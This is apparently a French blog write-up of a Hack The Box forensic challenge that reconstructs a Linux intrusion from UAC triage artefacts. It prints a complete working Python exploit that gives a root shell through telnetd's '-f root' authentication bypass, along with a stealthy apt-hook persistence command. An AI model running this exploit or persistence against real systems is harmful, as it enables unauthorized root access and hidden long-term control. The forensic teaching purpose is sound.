---
title: HTB Sherlock - Yggdrasil
time: 2026-10-21 09:00:00
categories: [ctf]
tags: [forensic, DFIR, linux, HTB, sherlock, UAC Triage]
image: /assets/posts/Yggdrasil/cover.png
---

## Forensic

## Yggdrasil

### Scénario

> An unauthorized outbound connection was detected on an Ubuntu workstation assigned to the development team. The host was isolated and provided for forensic triage.

---

### Q1 - What is the PID of the malicious process that granted the attacker access to the system?

Dans un triage UAC pour la recherche de processus malveillants, je commence toujours par le fichier `live_response/process/ps_auxwwwf.txt`, résultat de la commande `ps aux wwf`. Elle affiche la liste détaillée de tous les processus en cours sur un système Linux, sous forme d'arbre hiérarchique, sans tronquer les lignes de commande.

En parcourant les processus, on tombe rapidement sur le processus `update` de PID `5241`. Son chemin d'exécution pointe vers un dépôt utilisateur, dans un répertoire `vendor/bin/.cache`, emplacement inhabituel pour un exécutable. On voit aussi dans l'arborescence que ce processus mène à une connexion externe, ce qui correspond au contexte de l'alerte.

![q1](/assets/posts/Yggdrasil/Q1.png)

Le binaire caché `./vendor/bin/.cache/update` s'exécute et ouvre un premier interpréteur `/bin/sh`. Ensuite, chaque processus engendre le suivant (Python, puis script, puis un nouveau bash), jusqu'au lancement final de `socat`, qui ouvre le port réseau 4445.

Réponse : **5241**

---

### Q2 - What is the full path of the previous malicious process on the system?

Le chemin complet des binaires des processus en cours se trouve dans le fichier `live_response/process/running_processes_full_paths.txt`.

Le lien `/proc/5241/exe` fournit le chemin complet de l'exécutable associé au processus :

![q2](/assets/posts/Yggdrasil/Q2.png)

Réponse : **`/home/irek/Documents/mcp-connector-hub/vendor/bin/.cache/update`**

---

### Q3 - What is the IP address and port number to which the attacker connected?

La commande `ss -tanp` liste toutes les connexions réseau TCP (établies et en écoute), avec les adresses, ports, nom et PID du processus ayant ouvert chaque socket. En consultant `live_response/network/ss_-tap.txt`, on voit une connexion TCP établie depuis `192.168.112.150:47464` vers `172.168.40.101:1337`. Ce socket est partagé par la chaîne de processus allant de `update` au shell puis à `socat`.

![q3](/assets/posts/Yggdrasil/Q3.png)

Réponse : **172.168.40.101:1337**

---

### Q4 - After gaining initial access, the attacker discovered a network daemon running on the system that allowed him to obtain root access. What is the name of the vulnerable service or daemon that enabled the attacker to gain a root shell?

Les questions précédentes ont montré que l'attaquant a lancé `socat` pour la connexion. Filtrons donc `live_response/process/ps_auxwwwf.txt` sur `socat` :

```bash
grep -RniE 'socat' live_response/process/ps_auxwwwf.txt
219:root         936  0.0  0.1  10296  4552 ?        Ss   05:51   0:00 /usr/bin/socat TCP-LISTEN:23,fork,reuseaddr EXEC:/opt/telnetd/telnetd -n
309:irek        5452  0.0  0.1  10296  4564 pts/1    S+   08:00   0:00  |                           \_ socat file:/dev/pts/1,raw,echo=0 tcp-listen:4445
```

![q4](/assets/posts/Yggdrasil/Q4.png)

Le service `telnet.service` lance `socat` en écoute sur le port 23, qui exécute `/opt/telnetd/telnetd -n`. Le daemon vulnérable est donc **telnetd**, `socat` ne servant que de wrapper d'écoute et de lancement.

Réponse : **telnetd**

---

### Q5 - We need to collect all IOCs and IOAs so we can perform threat hunting to understand the breach radius. What is the full path of the malicious script file the attacker executed?

Regardons d'abord les traces de l'historique.

![q5](/assets/posts/Yggdrasil/Q5.png)

Un script a été lancé, mais il ne figure plus dans le dossier. Je lance un `grep` pour voir s'il se trouve ailleurs :

```bash
grep -RniE 'X2.py' .
./bodyfile/bodyfile.txt:393275:0|/tmp/.X11-unix/X2.py|3282754|-rw-rw-r--|1000|1000|2904|1775581575|1775581531|1775581536|1775581536
```

En forensic Linux, un bodyfile est un fichier de chronologie qui recense les métadonnées des fichiers d'un système. Il est généralement produit par des outils comme The Sleuth Kit (`fls`) et permet de reconstruire une timeline lors d'une investigation. C'est donc un bon moyen de savoir quand un fichier a été exécuté.

Le contenu de `X2.py` est le suivant :

```python
import socket
import sys
import threading
import argparse
import os

IAC  = 255
DONT = 254
DO   = 253
WONT = 252
WILL = 251
SB   = 250
SE   = 240

def negotiate(sock, data):
    clean_output = b""
    i = 0
    while i < len(data):
        if data[i:i+1] == b'\xff':
            if i + 1 >= len(data):
                break
            cmd = ord(data[i+1:i+2]) if sys.version_info[0] < 3 else data[i+1]
            if cmd in [DO, DONT, WILL, WONT]:
                if i + 2 >= len(data):
                    break
                opt = ord(data[i+2:i+3]) if sys.version_info[0] < 3 else data[i+2]
                if cmd == DO and opt != 39:
                    sock.sendall(bytes(bytearray([IAC, WONT, opt])))
                elif cmd == WILL:
                    sock.sendall(bytes(bytearray([IAC, DONT, opt])))
                i += 3
            elif cmd == SB:
                j = i + 2
                while j < len(data):
                    if data[j:j+1] == b'\xf0':
                        break
                    j += 1
                i = j + 1
            else:
                i += 2
        else:
            clean_output += data[i:i+1]
            i += 1
    return clean_output

def reader(s):
    while True:
        try:
            data = s.recv(4096)
            if not data:
                os._exit(0)
            text = negotiate(s, data)
            if text:
                if sys.version_info[0] >= 3:
                    sys.stdout.buffer.write(text)
                else:
                    sys.stdout.write(text)
                sys.stdout.flush()
        except:
            break

def exploit(target, port):
    print("[+] Connecting to " + str(target) + ":" + str(port) + "...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target, port))
        s.settimeout(None)
        s.sendall(b'\xff\xfb\x27\xff\xfa\x27\x00\x00USER\x01-f root\xff\xf0')
        t = threading.Thread(target=reader, args=(s,))
        t.daemon = True
        t.start()
        import time
        time.sleep(1)
        if not t.is_alive():
            print("[-] The target does not seem vulnerable")
            return
        while True:
            cmd = sys.stdin.readline()
            if not cmd:
                break
            s.sendall(cmd.encode() if sys.version_info[0] >= 3 else cmd)
    except (socket.timeout, ConnectionRefusedError, OSError):
        print("[-] The target seems to be unreachable")
    except KeyboardInterrupt:
        s.close()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("target")
    parser.add_argument("port", type=int, default=23, nargs='?')
    args = parser.parse_args()
    exploit(args.target, args.port)

if __name__ == "__main__":
    main()
```

Le script `/tmp/.X11-unix/X2.py` implémente la négociation Telnet et envoie une chaîne `USER` contenant `-f root`, ce qui correspond à l'exploit de la vulnérabilité identifiée à la question précédente.

Réponse : **`/tmp/.X11-unix/X2.py`**

---

### Q6 - What is the CVE ID of the exploited service or daemon that allowed privilege escalation?

La négociation observée correspond au contournement d'authentification de `telnetd` via la valeur utilisateur `-f root`.

![q6](/assets/posts/Yggdrasil/Q6.png)

Réponse : **CVE-2026-24061**

---

### Q7 - What is the full command the attacker executed to gain higher privileges?

L'historique de commandes de `irek` contient la commande complète :

```bash
python3 X2.py 127.0.0.1
```

Le script accepte un port optionnel, par défaut 23. La commande cible donc le service Telnet local.

Réponse : **`python3 X2.py 127.0.0.1`**

---

### Q8 - Lancement du script d'exploitation

```bash
./bodyfile/bodyfile.txt:393275:0|/tmp/.X11-unix/X2.py|3282754|-rw-rw-r--|1000|1000|2904|1775581575|1775581531|1775581536|1775581536
```

Dans le bodyfile, l'`atime` de `X2.py` est `1775581575`, soit `2026-04-07 17:06:15 UTC` :

```bash
date -u -d @1775581575
mar. 07 avril 2026 17:06:15 UTC
```

Réponse : **2026-04-07 17:06:15**

Le bodyfile allait être très utile pour la suite. J'ai écrit un script pour le parser :

```python
import csv
from datetime import datetime, timezone

headers = ["Nom_Fichier", "Date_Modification_M", "Date_Acces_A", "Date_Changement_Statut_C", "Date_Creation_Cr", "Taille_Octets", "MD5", "Permissions"]

def convert_date(timestamp_str):
    try:
        # Convertit le timestamp Unix en date lisible (AAAA-MM-JJ HH:MM:SS UTC)
        ts = int(timestamp_str)
        if ts <= 0:
            return ""
        return datetime.fromtimestamp(ts, tz=timezone.utc).strftime('%Y-%m-%d %H:%M:%S')
    except (ValueError, TypeError):
        return ""

with open("bodyfile.txt", "r", encoding="utf-8") as infile, open("uac_timeline_lisible.csv", "w", newline="", encoding="utf-8") as outfile:
    writer = csv.writer(outfile)
    writer.writerow(headers)

    for line in infile:
        if line.strip():
            parts = line.strip().split("|")

            # Extraction des données du bodyfile UAC
            md5 = parts[0]
            name = parts[1]
            mode = parts[3]
            size = parts[6]
            atime = convert_date(parts[7])
            mtime = convert_date(parts[8])
            ctime = convert_date(parts[9])
            crtime = convert_date(parts[10]) if len(parts) > 10 else ""

            # Écriture dans le CSV avec un ordre logique pour l'analyse (nom puis dates)
            writer.writerow([name, mtime, atime, ctime, crtime, size, md5, mode])

print("Fichier généré")
```

![q8](/assets/posts/Yggdrasil/Q8.png)

---

### Q9 - When did the attacker obtain a root shell on the system?

Le fichier `auth.log` permet de surveiller l'accès au système, car il enregistre les tentatives d'authentification, réussies ou échouées. Qu'un utilisateur s'authentifie en local ou à distance (SSH par exemple), l'accès est consigné dans ce journal.

D'après les questions précédentes, l'attaquant a obtenu un accès root via Telnet.

![q9](/assets/posts/Yggdrasil/Q9.png)

`auth.log.1` confirme l'ouverture de la session root par `.telnet` à `19:06:27` heure locale. Converti en UTC, l'événement correspond à `17:06:27`.

Réponse : **2026-04-07 17:06:27 UTC** (19:06:27 CEST)

---

### Q10 - Once the attacker gained root access on the system, they began preparing for data exfiltration. Data was staged and compressed before being exfiltrated outside the network. What is the full path of the archive file?

J'ai passé beaucoup de temps à chercher l'archive sur le système sans succès. En repensant aux processus en cours, j'avais repéré :

```bash
 irek        1963  0.0  1.0 645856 39860 ?        SNsl 05:51   0:01  \_ /usr/libexec/tracker-miner-fs-3
```


Tracker 3 est le moteur d'indexation de GNOME, celui qui alimente la recherche de fichiers du bureau. Deux processus de la session de `irek` le font tourner :

- `tracker-miner-fs-3` parcourt les dossiers de l'utilisateur et enregistre les chemins trouvés ;
- `tracker-extract-3` extrait les métadonnées de chaque fichier.

Leur base se trouve dans `/home/[user]/.cache/tracker3/files/`. Elle conserve les chemins même après suppression, ce qui en fait un artefact précieux pour retrouver des fichiers effacés.

![q10](/assets/posts/Yggdrasil/Q10.png)

J'ai exporté les bases Tracker pour les analyser avec [crush-forensics](https://github.com/kalink0/crush-forensics/releases). Comme il existe un fichier WAL, certaines données ne sont pas dans la base principale mais dans le WAL, que l'outil permet de lire.

Les bases Tracker et leurs WAL contiennent l'URI `file:///home/irek/system_logs.zip`.

![q10](/assets/posts/Yggdrasil/Q10-2.png)

Réponse : **`/home/irek/system_logs.zip`**

---

### Q11 - The developer had many sensitive files on their server, including sensitive project files. How many total files were exfiltrated by the attacker and should be considered leaked?

J'ai aussi passé beaucoup de temps sur cette question. En parcourant syslog, j'ai vu que `tracker-extract` avait démarré autour de l'heure de l'attaque, à 17:10:56 UTC.

![q11](/assets/posts/Yggdrasil/q11.png)

J'ai donc filtré le bodyfile sur cette plage horaire pour compter les fichiers modifiés :

![q11](/assets/posts/Yggdrasil/11-2.png)
![q11](/assets/posts/Yggdrasil/11-3.png)

Je pensais avoir trouvé le bon nombre, mais la soumission a été refusée. J'ai alors affiné le filtre à la seconde :

![q11](/assets/posts/Yggdrasil/11-4.png)
![q11](/assets/posts/Yggdrasil/11-5.png)

Réponse : **489**

---

### Q12 - The attacker used a native tool to exfiltrate data from the server. When did the attacker start exfiltrating the archived data?

Les outils natifs Linux capables d'exfiltrer des données sont nombreux : `nc`, `socat`, `curl`... J'ai donc filtré le bodyfile sur ces binaires.

En filtrant sur `/usr/bin/curl`, j'ai vu qu'il avait été utilisé pendant l'attaque, peu de temps avant `/usr/bin/zip`.

![q12](/assets/posts/Yggdrasil/12.png)

Réponse : **2026-04-07 17:11:43**

---

### Q13 - The attacker used a malicious ELF binary for persistence. What was the path where it was stored on disk before being moved to a new location?

C'est la question la plus difficile de l'exercice. J'ai cherché les fichiers modifiés pendant l'attaque, après l'exfiltration, mais le bodyfile en contenait beaucoup. À bout, j'ai lancé des commandes `rg` et `grep` avec des expressions susceptibles de figurer dans un binaire de persistance.

![q13](/assets/posts/Yggdrasil/Q13.png)

Je suis tombé sur :

![q13](/assets/posts/Yggdrasil/Q13-2.png)

Le nom du binaire semble inhabituel : le binaire légitime serait normalement `/usr/bin/less`. En recherchant dans le bodyfile, on constate que ce binaire a été créé pendant l'attaque.

![q13](/assets/posts/Yggdrasil/Q13-3.png)

Il fallait ensuite retrouver son ancien emplacement. J'ai donc réanalysé les données Tracker : le binaire avait pu être indexé à son ancien emplacement.

![q13](/assets/posts/Yggdrasil/q13-4.png)

Le WAL de Tracker avait conservé la trace de cet ancien emplacement.

Réponse : **`/home/irek/les`**

---

### Q14 - After exfiltrating the sensitive data, the attacker set up a stealth persistence mechanism to maintain long-term access on the system. The attacker modified a file to create a stealth persistence workflow that executes the malicious ELF binary whenever a certain activity occurs on the server. What is the full command configured to run the persistence routine?

Le fichier `/etc/apt/apt.conf.d/conf` définit un hook `DPkg::Post-Invoke`. Il lance le binaire en arrière-plan et masque sa sortie :

```sh
bash -c 'nohup /usr/bin/les > /dev/null 2>&1 &'
```

![q14](/assets/posts/Yggdrasil/q14.png)

Réponse : **`bash -c 'nohup /usr/bin/les > /dev/null 2>&1 &'`**

---

### Q15 - After setting up the persistence configuration file, the attacker modified the binary responsible for establishing the C2 connection to run with root privileges. When did they perform this action?

On sait que le binaire utilisé pour la persistance est `/usr/bin/les`. Il suffit donc de consulter le bodyfile pour voir à quelle heure son statut a changé.

![q15](/assets/posts/Yggdrasil/q15.png)

Réponse : **2026-04-07 17:18:24**